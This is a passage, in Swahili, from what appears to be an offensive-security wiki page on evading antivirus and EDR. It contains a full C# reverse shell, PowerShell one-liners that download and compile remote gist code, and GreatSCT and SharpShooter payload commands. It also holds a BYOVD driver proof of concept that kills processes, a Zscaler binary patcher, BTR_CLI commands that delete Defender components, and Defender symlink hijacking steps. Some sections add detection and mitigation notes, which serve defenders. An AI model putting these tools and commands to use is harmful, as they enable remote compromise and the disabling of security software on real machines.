- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamishia binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **hivi karibuni** ndani ya **victim**

#### **Reverse connection**

**Attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth, usifanye mambo yafuatayo

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa kutumia `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika saraka hiyo hiyo, la sivyo [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) litafunguka
- Usikimbize `winvnc -h` ili kupata usaidizi, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender ya sasa itasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Kompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuzima AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia kifaa kidogo cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Kifaa hiki huleta **driver yake yenyewe iliyo na udhaifu lakini *imesainiwa*** na kuitumia vibaya kutekeleza shughuli za kernel zilizo na mamlaka ya juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary hiyo ni driver iliyosainiwa kihalali `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa huduma**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kukatisha mchakato wowote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili lolote kwenye diski |
   | `0x990001D0` | Kuondoa driver na kuondoa huduma |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua michakato *iliyolindwa*, kuisitisha, au kuingilia objects za kernel bila kujali vipengele vya hardening kama PPL/PP, ELAM au vinginevyo.

Ugunduzi / Upunguzaji wa Hatari
•  Washa orodha ya Microsoft ya kuzuia vulnerable drivers (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa huduma mpya za *kernel* na toa arifa driver inapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au haipo kwenye allow-list.
•  Fuatilia handles za user-mode kwa custom device objects zikifuatiwa na miito ya kutia shaka ya `DeviceIoControl`.

### Kupita Ukaguzi wa Hali ya Kifaa wa Zscaler Client Connector kwa Kurekebisha Binary Zilizo Kwenye Diski

Zscaler’s **Client Connector** hutumia sheria za hali ya kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za usanifu hufanya iwezekane kupita ukaguzi kabisa:

1. Tathmini ya hali ya kifaa hufanyika **upande wa client pekee** (boolean hutumwa kwa server).
2. Endpoints za ndani za RPC hukagua tu kwamba executable inayounganishwa **imetia saini na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizotiwa saini kwenye diski**, mifumo yote miwili inaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati ili kila ukaguzi uonekane umetimiza masharti |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | Hufanywa NOP ⇒ mchakato wowote (hata usiotia saini) unaweza kuunganisha kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa integrity wa tunnel | Hupitishwa kwa njia ya mkato |

Sehemu ndogo ya patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* Ukaguzi **wote** wa posture unaonyesha **green/compliant**.
* Binary zisizosainiwa au zilizorekebishwa zinaweza kufungua endpoint za RPC za named-pipe (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata ufikiaji usio na vizuizi kwenye mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu wa kesi unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa mteja pekee na ukaguzi rahisi wa signature vinavyoweza kushindwa kwa kurekebisha byte chache.

## Matumizi mabaya ya utendakazi unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni sehemu halali ya Microsoft iliyosainiwa ya urekebishaji, isiyo na hitilafu ya uharibifu wa kumbukumbu wala kiolesura cha IOCTL; baada ya kupata ufikiaji wa msimamizi na `SeLoadDriverPrivilege`, operator anaweza badala yake kughushi transaction yake binafsi ya urekebishaji na kupata operesheni za faili/registry za Ring-0 zilizokusudiwa. Hii ni **primitive ya kuondoa AV/EDR baada ya kuathiri mfumo, si ufikiaji wa awali au kupandisha mamlaka**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya mtu wa tatu inayotia shaka.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida, Defender huhifadhi resource kama faili ya nasibu ya `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS inayorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika feedback, na kurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki ikifanya kazi. Service ghushi huwa na thamani zifuatazo bainifu.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Streamu ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena ufunguo usiobadilika wa byte 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina kichwa cha jumla cha byte 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya kichwa na transaction ID inayotokana na payload), kikifuatiwa na njia ya feedback ya UTF-16 inayomalizika kwa null na idadi yoyote ya items. Kila item ina kichwa cha byte 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data maalum kwa action inayoishia kwa **byte NUL nne haswa**. Kila eneo la kichwa/data hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, hali ya awali `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya action vinavyokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya item | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, hata ikiwa imefungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye path iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry pamoja na yaliyomo ndani yake |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde path za key ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye data ya wire ni **backslash mbili mfululizo**; path iliyoandikwa kwa muundo wa kawaida haitagawanywa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini byte nne za kwanza za data ya kila item hubadilika na kuwa `NTSTATUS` yake. Kwa actions 1 na 2, ambazo hazina sehemu ya flags inayoongoza, BTR huhamisha path hadi kwenye byte nne za mwisho zilizohifadhiwa ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Workflow ya `BTR_CLI` na dirisha la early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: hutoa `BTR.sys` kutoka Defender ya ndani, huunda `<random>.sys:changelist` na stream ya feedback, huserialisha/hukagua checksum/husimba actions zilizounganishwa, huunda moja kwa moja key ya registry ya service, kisha huita `NtLoadDriver` kwa `-trigger now` au huiacha kama driver ya system-start kwa `-trigger boot`. Kuweka data moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW`, kwa hiyo **hakuleti** Event ID 7045 ya usakinishaji wa service. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya I/O ya faili kutoka `DriverEntry` kabla stack ya hifadhi na link ya `SystemRoot` hazijawa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini madereva mengi ya usalama yanayoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vya boot-start kama `WdFilter` vinaweza kuwa tayari vimepakiwa, lakini BTR inaweza kuondoa binaries au usanidi wa huduma zao kabla ya uanzishaji unaofuata, na inaweza kufuta executable za huduma kabla SCM haijazizindua. ELAM haizibi mwanya huu kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina sahihi halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika transaction moja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa kwenye msimbo: BTR huunda logi hii, kisha hushughulikia ombi lake lenyewe la kufuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka feedback katika `<random>.sys:<random>.dat` kukiruhusu kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uwiano wa ugunduzi wenye ishara dhahiri

Sheria zinazotegemea sahihi pekee na orodha ya Microsoft ya kuzuia madereva yaliyo hatarini hazishughulikii matumizi mabaya ya utendakazi uliokusudiwa wa BTR. Pendelea uwiano huu wa kitabia, huku ukitofautisha asili halali ya Defender na launcher isiyohusiana nayo.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Uundaji wa `.sys:changelist` ni wa kawaida kwa uwekaji wa BTR. ADS ya `.dat` iliyoambatishwa kwenye `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka feedback chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` yenye `Args=...:changelist` na `Group=Boot Bus Extender` na kutokuwepo kwa tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** linganisha upakiaji wa driver ya BTR inayotoka kwenye chanzo kisicho cha Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa binaries za usalama.
- **Sysmon 11 -> 23:** toa tahadhari kwa uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; sahihi ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati driver ya zana ya usalama inapowekwa na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuhujumu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza mpangilio wa ngazi wa signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu zaidi pekee iweze kuhujumiana. Kwa upande wa mashambulizi, ikiwa unaweza kuzindua kihalali binary iliyowezeshwa PPL na kudhibiti arguments zake, unaweza kubadilisha utendakazi usio na madhara (k.m., logging) kuwa primitive yenye mipaka ya kuandika dhidi ya saraka zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ni nini hufanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima isainiwe kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa CreateProcess kwa kutumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayolingana na signer wa binary (k.m., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers za anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers za Windows). Viwango visivyo sahihi vitasababisha hitilafu wakati wa uundaji.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Zana saidizi ya open-source: CreateProcessAsPPL (huchagua protection level na kupeleka arguments kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujianzisha yenyewe na hukubali parameter ya kuandika faili ya log kwenye path iliyobainishwa na mwitaji.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika ukiwa umeungwa mkono na PPL.
- ClipUp haiwezi kuchanganua paths zenye nafasi; tumia short paths za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

Vifaa vya kusaidia kupata short paths za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mnyororo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN inayoweza kutumia PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (k.m., CreateProcessAsPPL).
2) Pitisha argument ya ClipUp ya log-path ili kulazimisha uundaji wa faili kwenye directory ya AV iliyolindwa (k.m., Defender Platform). Tumia majina mafupi ya 8.3 inapohitajika.
3) Ikiwa AV huwa imefungua/imefunga binary lengwa wakati inaendeshwa (k.m., MsMpEng.exe), panga uandishi wakati wa kuwasha kompyuta, kabla ya AV kuanza, kwa kusakinisha service ya auto-start inayotekelezwa mapema kwa uhakika. Thibitisha mpangilio wa kuwasha kwa Process Monitor (boot logging).
4) Kompyuta inapowashwa upya, uandishi unaoungwa mkono na PPL hufanyika kabla ya AV kufunga binaries zake, na hivyo kuharibu faili lengwa na kuzuia kuanza kwake.

Mfano wa invocation (paths zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Maelezo na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika isipokuwa mahali yanapoandikwa; primitive hii inafaa kwa kuharibu maudhui badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na nafasi ya kufanya reboot.
- Muda ni muhimu: target haipaswi kuwa wazi; kutekeleza wakati wa boot huepusha file locks.

Ugunduzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na launchers zisizo za kawaida, wakati wa boot au karibu na wakati huo.
- Services mpya zilizosanidiwa kujiwasha zenyewe na kuendesha binaries zinazotiliwa shaka, na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuanza kwa Defender.
- Ufuatiliaji wa uadilifu wa faili za Defender/maelekezo ya Platform; uundaji/urekebishaji usiotarajiwa wa faili unaofanywa na processes zenye protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: punguza binaries zilizotiwa saini zinazoweza kuendeshwa kama PPL na parents zinazoruhusiwa; zuia matumizi ya ClipUp nje ya miktadha halali.
- Usimamizi wa service: zuia uundaji/urekebishaji wa services zinazowashwa zenyewe na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha ulinzi wa Defender dhidi ya tampering na ulinzi wa early-launch umewashwa; chunguza hitilafu za uanzishaji zinazoashiria uharibifu wa binary.
- Fikiria kuzima uundaji wa short names za 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa mazingira yako yanaendana na mabadiliko hayo (fanya majaribio kwa kina).

## Kuhujumu Microsoft Defender kupitia Utekaji wa Symlink wa Folda ya Toleo la Platform

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa lexicographic (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za service ya Defender kutoka humo (na kusasisha njia za service/registry ipasavyo). Uchaguzi huu huamini entries za directory, zikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na attacker na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kufanya reboot au kuchochea Defender kuchagua upya platform (service huanzishwa upya wakati wa boot)
- Zana zilizojengewa ndani tu zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake yenyewe, lakini uchaguzi wake wa platform huamini entries za directory na huchagua toleo la juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa target inaelekezwa kwenye path iliyolindwa/kuaminiwa.

Hatua kwa hatua (mfano)
1) Andaa clone inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory yenye toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa kwingine:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona path mpya ya process chini ya `C:\TMP\AV\` na service configuration/registry ikionyesha location hiyo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka kwenye application directory yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili path iliyosanidiwa isitatuliwe wakati wa kuwasha tena, na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa mbinu hii yenyewe haitoi privilege escalation; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

